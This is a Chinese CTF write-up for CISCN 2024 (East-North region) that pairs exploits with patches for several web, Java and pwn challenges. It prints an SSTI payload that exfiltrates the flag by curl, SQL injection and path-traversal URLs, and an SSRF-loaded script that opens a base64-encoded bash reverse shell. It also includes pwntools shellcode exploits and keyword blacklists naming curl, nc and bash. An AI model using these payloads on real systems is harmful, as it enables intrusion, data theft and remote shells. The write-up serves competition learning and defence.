# CISCN华东北 2024 比赛题解

> 原文: https://www.ctfiot.com/190139.html
> ID: 190139

点击蓝字

关注我们

声明

本文作者：CTF战队-xia0le

本文字数：约6800字

阅读时长：约18分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

CTF战队正在招新~

简历投递至 match(AT)wgpsec.org （AT替换为@）

❝

CISCN 华东北 2024

比赛附件关注公众号“WgpSec狼组安全团队” 回复 CISCN2024-华东北 下载

WEB

python-1

break

payload 禁用了print函数，使用如下payload进行无回显攻击，本地开启端口，如果拼接函数popen和命令curl

name={%set x=cycler.next.__globals__.__builtins__.__import__('os')['p''open']('cu'+'rl http://10.101.64.15:
8081/`sort /fl*`').read()%}

无回显攻击

fix

添加黑名单 {% %}

# -*- coding: UTF-8 -*-

from flask import Flask, request,render_template,render_template_string

app = Flask(__name__)

def blacklist(name):
    blacklists = ["print","cat","flag","nc","bash","sh","curl","{{","}},""wget","ash","session","class","subclasses","for","popen","args","{%","%}"]
    for keyword in blacklists:
        if keyword in name:
            return True
    return False

@app.route("/", methods=["GET","POST"])
def index():
    if request.method == "POST":
        try:
            name = request.form['name']
            names = blacklist(name)
            if names == True:
                return "Oh,False!"
      

            html = '''<html><head><title>^_^</title></head><h1>Hello: %s</h1></html>''' % name
            return render_template_string(html)
        
except ValueError:
            pass
    else:
        html = '''<html><head><title>^_^</title></head><h1>Change.</h1></html>'''
        return render_template_string(html)

python-2

break

题目非预期了，给的db里就有flag
db内容

fix

这里存在sql注入，注释即可
注释sql注入

php-1

fix

d盾扫描出来后门，注释即可
注释后门

php-2

break

/var/www/html/action/adminuser/searchmodify.php存在sql注入漏洞 大小写绕过union和select

http://192.64.1.3/adminuser.php?action=searchmodify&id=-1' Union seLEct NULL,CONCAT(0x1,iFNULL(CAST(`name` AS CHAR),0x20),0x1),NULL,NULL FROM cf.flag-- -

fix

添加转义addslashes函数
添加转义函数

php-3

break

glob协议爆破文件

import requests
import time
strings = "dqazwsxedcrfvtgb1234567890yhnujmikolpphp."

tmp = ""
for i in strings:
    url = "http://192.64.1.149/?path=glob:///var/www/html/"+tmp+i+'*'
    print(url)
    res = requests.get(url=url).text
    if "yes,it exists" in res:
        tmp += i
        print(tmp)
        time.sleep(1)

然后得到页面d88554c739859dfe.php

<?php
#flag in /flag.txt
highlight_file(__FILE__);
error_reporting(0);
$content=$_GET['cmd'];
// Set blacklist
$substitutions = array(

' ' => '',
'flag' => '',
'cat' =>'',
'&&' =>'',
'||' =>'',
'%0a'=>'',
'less'=>'',
'more'=>'',
'%0d'=>'',
'|'=>'',
'&'=>'',
);
$cmd = str_replace( array_keys( $substitutions ), $substitutions, $content );
if(strlen($cmd)>12)
{
    echo "Not very good";
}
else
{
    system($cmd);
}

http://192.64.1.149/d88554c739859dfe.php?cmd=sort%09/f*

fix

flag替換成123

<?php
#flag in /flag.txt
highlight_file(__FILE__);
error_reporting(0);
$content=$_GET['cmd'];
// Set blacklist
$substitutions = array(

' ' => '',
'flag' => '123',
'cat' =>'',
'&&' =>'',
'||' =>'',
'%0a'=>'',
'less'=>'',
'more'=>'',
'%0d'=>'',
'|'=>'',
'&'=>'',
);
$cmd = str_replace( array_keys( $substitutions ), $substitutions, $content );
if(strlen($cmd)>12)
{
    echo "Not very good";
}
else
{
    system($cmd);
}

php-4

break

漏洞文件：

/var/www/html/admin/inclues/set_page.php

直接目录穿越进行文件读取

http://192.64.1.106/admin/admin.php?act=set_footer&file=../../../../../../../flag.txt

flag

Fix

加个替换，将..替换成空
加替换

java-1

break

ssrf 绕过本地限制即可

读取远程恶意js文件

http://192.44.1.112:
8080/geturl?url=http://127.0.0.1:
8080/cmd?test=http://10.101.64.12/poc.js

var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwMS42NC4xMi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}");}

读取恶意js

fix

注释加载恶意js的地方即可
注释恶意js

java-2

fix

jdbc反序列化，直接将连接数据库注释

数据库连接注释

PWN

pwn-1
pwn1

Fix

stack 可执行，

把 stack 默认权限改成 rw

把这个 4 改成 8

作者

CTF战队 · xia0le

求知若渴，虚心若愚

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
name={%set x=cycler.next.__globals__.__builtins__.__import__('os')['p''open']('cu'+'rl http://10.101.64.15:
8081/`sort /fl*`').read()%}
# -*- coding: UTF-8 -*-

from flask import Flask, request,render_template,render_template_string

app = Flask(__name__)

def blacklist(name):
    blacklists = ["print","cat","flag","nc","bash","sh","curl","{{","}},""wget","ash","session","class","subclasses","for","popen","args","{%","%}"]
    for keyword in blacklists:
        if keyword in name:
            return True
    return False

@app.route("/", methods=["GET","POST"])
def index():
    if request.method == "POST":
        try:
            name = request.form['name']
            names = blacklist(name)
            if names == True:
                return "Oh,False!"
      

            html = '''<html><head><title>^_^</title></head><h1>Hello: %s</h1></html>''' % name
            return render_template_string(html)
        
except ValueError:
            pass
    else:
        html = '''<html><head><title>^_^</title></head><h1>Change.</h1></html>'''
        return render_template_string(html)
http://192.64.1.3/adminuser.php?action=searchmodify&id=-1' Union seLEct NULL,CONCAT(0x1,iFNULL(CAST(`name` AS CHAR),0x20),0x1),NULL,NULL FROM cf.flag-- -
import requests
import time
strings = "dqazwsxedcrfvtgb1234567890yhnujmikolpphp."

tmp = ""
for i in strings:
    url = "http://192.64.1.149/?path=glob:///var/www/html/"+tmp+i+'*'
    print(url)
    res = requests.get(url=url).text
    if "yes,it exists" in res:
        tmp += i
        print(tmp)
        time.sleep(1)
<?php
    #flag in /flag.txt
highlight_file(__FILE__);
error_reporting(0);
$content=$_GET['cmd'];
// Set blacklist
$substitutions = array(

' ' => '',
'flag' => '',
'cat' =>'',
'&&' =>'',
'||' =>'',
'%0a'=>'',
'less'=>'',
'more'=>'',
'%0d'=>'',
'|'=>'',
'&'=>'',
);
$cmd = str_replace( array_keys( $substitutions ), $substitutions, $content );
if(strlen($cmd)>12)
{
    echo "Not very good";
}
else
{
    system($cmd);
}
http://192.64.1.149/d88554c739859dfe.php?cmd=sort%09/f*
<?php
    #flag in /flag.txt
highlight_file(__FILE__);
error_reporting(0);
$content=$_GET['cmd'];
// Set blacklist
$substitutions = array(

' ' => '',
'flag' => '123',
'cat' =>'',
'&&' =>'',
'||' =>'',
'%0a'=>'',
'less'=>'',
'more'=>'',
'%0d'=>'',
'|'=>'',
'&'=>'',
);
$cmd = str_replace( array_keys( $substitutions ), $substitutions, $content );
if(strlen($cmd)>12)
{
    echo "Not very good";
}
else
{
    system($cmd);
}
/var/www/html/admin/inclues/set_page.php
http://192.64.1.106/admin/admin.php?act=set_footer&file=../../../../../../../flag.txt
http://192.44.1.112:
8080/geturl?url=http://127.0.0.1:
8080/cmd?test=http://10.101.64.12/poc.js

var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwMS42NC4xMi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}");}
from pwn import *
import sys
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :
u32(data.ljust(4,b'x00'))
uu64    = lambda data               :
u64(data.ljust(8,b'x00'))
ls      = lambda data               :
log.success(data)
lss     = lambda s                  :
log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))

context.arch      = 'amd64'
context.log_level = 'debug'
context.terminal  = ['tmux','splitw','-h','-l','130']
def start(binary,argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.RE:
        return remote('192.64.1.194',80)
    elif args.AWD:
        # python3 exp.py AWD 1.1.1.1 PORT
        IP = str(sys.argv[1])
        PORT = int(sys.argv[2])
        return remote(IP,PORT)
    else:
        return process([binary] + argv, *a, **kw)

binary = './pwn'
libelf = ''

if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libc
if (libelf!=''): libc = ELF(libelf)

gdbscript = '''
brva 0x0014B7
brva 0x0014D7
    #continue
'''.format(**locals())

io = start(binary)

def sett(name):
    ru('2: get namen')
    sl('1')
    ru('->set name')
    s(name)

    #gdb.attach(io,gdbscript)
pay = f'%{6+0xb}$p%{6+0xc}$p'
sett(pay)

ru('2: get namen')
sl('2')

ru('0x')
can = int(r(16),16)
lss('can')
st = int(r(len('0x7ffc4963dec0')),16)
lss('st')
ret = st - 0x60
    #pay = asm(shellcraft.read(0,ret,0x400)).ljust(72,b'x90')
pay  = asm(shellcraft.openat(-100, 'flag',0))
pay += asm(shellcraft.sendfile(1,'rax',0,0x50))
pay  = pay.ljust(72,b'A')
pay += p64(can) * 2
pay += p64(ret)
sett(pay)

    #ru('2: get namen')
    #sl('2')

ru('2: get namen')
sl('3')

    #pause()
    #pay = b'x90' * 0x20
    #pay += asm(shellcraft.openat(-1, 'flag'))
    #pay += asm(shellcraft.sendfile(1,'rax',0,0x50))
#
    #sl(pay)

itr()
from pwn import *
import sys
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :
u32(data.ljust(4,b'x00'))
uu64    = lambda data               :
u64(data.ljust(8,b'x00'))
ls      = lambda data               :
log.success(data)
lss     = lambda s                  :
log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))

context.arch      = 'amd64'
context.log_level = 'debug'
context.terminal  = ['tmux','splitw','-h','-l','130']
def start(binary,argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.RE:
        return remote('192.64.1.217',80)
    elif args.AWD:
        # python3 exp.py AWD 1.1.1.1 PORT
        IP = str(sys.argv[1])
        PORT = int(sys.argv[2])
        return remote(IP,PORT)
    else:
        return process([binary] + argv, *a, **kw)

binary = './pwn'
libelf = ''

if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libc
if (libelf!=''): libc = ELF(libelf)

gdbscript = '''
b *0x401E03
b *0x402150
    #continue
'''.format(**locals())

io = start(binary)

def ls_flag():
    ru('6: check flagn')
    sl('1')

def add_flag():
    ru('6: check flagn')
    sl('2')

def edit_flag(idx,data):
    ru('6: check flagn')
    sl('3')
    ru(':id')
    sl(str(idx))
    #pause()
    sl(str(data))

    #gdb.attach(io,gdbscript)
add_flag()

ru('6: check flagn')
sl('6')

x = 0x4e67a0

ru('6: check flagn')
sl('5')
sl(str(x))

ru('flag_get::')
ru(':')
x= uu64(r(4))

lss('x')
flag = x + 3392 - 0x1f
ru('6: check flagn')
sl('5')
sl(str(flag))

    #edit_flag(0x4e6018+184, 0x401E03)
    #edit_flag(0x4e6018, 0x401E03)
    #while(1):
#    d = io.recv(200)
#    if b'flag{' in d:
#        print(d)
#        pause()
#
#

    #io.close()
itr()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/8-1719447816.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/9-1719447817.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/0-1719447817.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/1-1719447818.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/6-1719447818.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/4-1719447819.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/5-1719447820.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/2-1719447820.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/0-1719447821.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/6-1719447821.png)